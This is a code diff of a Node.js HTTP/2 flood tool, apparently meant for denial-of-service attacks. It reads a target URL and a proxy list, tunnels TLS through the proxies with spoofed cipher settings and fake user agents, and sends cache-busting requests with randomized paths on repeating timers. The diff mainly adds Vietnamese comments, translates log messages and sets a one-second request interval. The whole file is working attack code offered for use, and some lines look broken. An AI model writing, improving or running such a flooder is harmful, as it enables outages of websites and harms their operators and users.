@@ -1,7 +1,4 @@
 const { exec } = require('child_process');
-require('events').EventEmitter.defaultMaxListeners = 0;
-process.setMaxListeners(0);
-
 const fs = require('fs');
 const url = require('url');
 const http = require('http');
@@ -9,8 +6,8 @@ const tls = require('tls');
 const crypto = require('crypto');
 const http2 = require('http2');
 const fakeua = require('fake-useragent');
-tls.DEFAULT_ECDH_CURVE;
 
+// Thiết lập các tham số cơ bản
 const objetive = process.argv[2];
 const parsed = url.parse(objetive);
 const sigalgs = [
@@ -26,18 +23,27 @@ const sigalgs = [
 ];
 const SignalsList = sigalgs.join(':');
 
+// Lớp xây dựng TLS
 class TlsBuilder {
-    constructor(socket) {
+    constructor() {
         this.curve = "GREASE:X25519:x25519";
         this.sigalgs = SignalsList;
-        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
+        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION |
+                   crypto.constants.SSL_OP_NO_TICKET |
+                   crypto.constants.SSL_OP_NO_SSLv2 |
+                   crypto.constants.SSL_OP_NO_SSLv3 |
+                   crypto.constants.SSL_OP_NO_COMPRESSION |
+                   crypto.constants.SSL_OP_NO_RENEGOTIATION |
+                   crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+                   crypto.constants.SSL_OP_TLSEXT_PADDING |
+                   crypto.constants.SSL_OP_ALL |
+                   crypto.constants.SSLcom;
     }
     
     async http2TUNNEL(socket) {
         const uas = fakeua();
-        socket.setKeepAlive(true, 1000);
-        socket.setTimeout(10000);
         
+        // Thiết lập các thông số payload
         let payload = {
             ":method": "GET",
             "Referer": objetive,
@@ -52,6 +58,7 @@ class TlsBuilder {
             ":path": parsed.path + "?" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
         };
         
+        // Tạo kết nối HTTP/2 thông qua TLS
         const tunnel = http2.connect(parsed.href, {
             createConnection: () => tls.connect({
                 socket: socket,
@@ -66,16 +73,22 @@ class TlsBuilder {
                 rejectUnauthorized: false,
                 ALPNProtocols: ['h2'],
             }, () => {
+                // Tạo và gửi các yêu cầu định kỳ
                 setInterval(async () => {
                     await tunnel.request(payload).close();
-                });
+                }, 1000); // Gửi yêu cầu mỗi giây
             })
         });
     }
 }
 
-const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });
+// Đọc danh sách proxy từ file
+const proxies = fs.readFileSync('utils/http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n').filter(Boolean);
 
+// Khởi tạo HTTP agent để duy trì kết nối
+const keepAliveAgent = new http.Agent({ keepAlive: true });
+
+// Kiểm tra tính hợp lệ của proxy
 async function checkProxy(proxy) {
     return new Promise((resolve, reject) => {
         proxy = proxy.split(':');
@@ -101,47 +114,52 @@ async function checkProxy(proxy) {
     });
 }
 
+// Chạy vòng lặp vô hạn để duy trì việc gửi yêu cầu
 async function runWithValidProxy() {
     let validProxy = null;
     
     while (!validProxy) {
-        const proxy = proxies.shift(); // Take the first proxy from the list
+        const proxy = proxies.shift(); // Lấy proxy đầu tiên từ danh sách
         if (!proxy) {
-            console.log('No more proxies available. Exiting.');
+            console.log('Không còn proxy khả dụng. Thoát.');
             process.exit();
         }
         
         try {
             validProxy = await checkProxy(proxy);
         } catch (err) {
-            console.error(`Proxy ${proxy} is not working, trying another one...`);
+            console.error(`Proxy ${proxy} không hoạt động, thử proxy khác...`);
         }
     }
     
+    // Khởi tạo và sử dụng lớp xây dựng TLS
     const tlsBuilder = new TlsBuilder();
     tlsBuilder.http2TUNNEL(validProxy);
 }
 
+// Thiết lập lịch kiểm tra proxy
 function scheduleProxyCheck() {
     const interval = setInterval(async () => {
         if (!proxies.length) {
-            console.log('No more proxies available. Exiting.');
+            console.log('Không còn proxy khả dụng. Thoát.');
             clearInterval(interval);
             process.exit();
         }
         
         await runWithValidProxy();
-    }, 5000);
+    }, 5000); // Kiểm tra proxy mỗi 5 giây
 }
 
+// Bắt đầu chạy lịch kiểm tra proxy và gửi yêu cầu
 scheduleProxyCheck();
 
+// Bắt các lỗi không xử lý và xử lý không xác định
 process.on('uncaughtException', (err) => {
-    console.error('Uncaught Exception:', err);
+    console.error('Lỗi không xử lý:', err);
     process.exit(1);
 });
 
 process.on('unhandledRejection', (err) => {
-    console.error('Unhandled Rejection:', err);
+    console.error('Lỗi không xử lý:', err);
     process.exit(1);
 });
